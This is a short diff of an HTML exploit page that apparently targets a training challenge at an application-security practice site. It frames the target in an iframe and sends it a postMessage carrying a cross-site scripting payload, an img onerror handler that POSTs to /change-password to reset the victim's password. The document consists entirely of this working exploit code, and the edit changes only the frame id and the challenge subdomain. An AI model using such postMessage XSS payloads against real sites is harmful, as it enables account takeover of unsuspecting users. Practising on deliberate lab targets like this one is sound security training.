@@ -1,9 +1,9 @@
 <html>
 <body>
-<iframe id="frame" src="https://challenge.appsecmaster.net/"></iframe>
+<iframe id="test" src="https://dl1a4hc7.challenge.appsecmaster.net/"></iframe>
 <script>
-  document.getElementById('frame').onload = function () {
-    document.getElementById('frame').contentWindow.postMessage({
+  document.getElementById('test').onload = function () {
+    document.getElementById('test').contentWindow.postMessage({
       type: 'alert',
       content: '<img src=x onerror="fetch(\'/change-password\',{method:\'POST\',headers:{\'Content-Type\':\'application/x-www-form-urlencoded\'},body:\'new_password=test\'})">'
     }, '*');
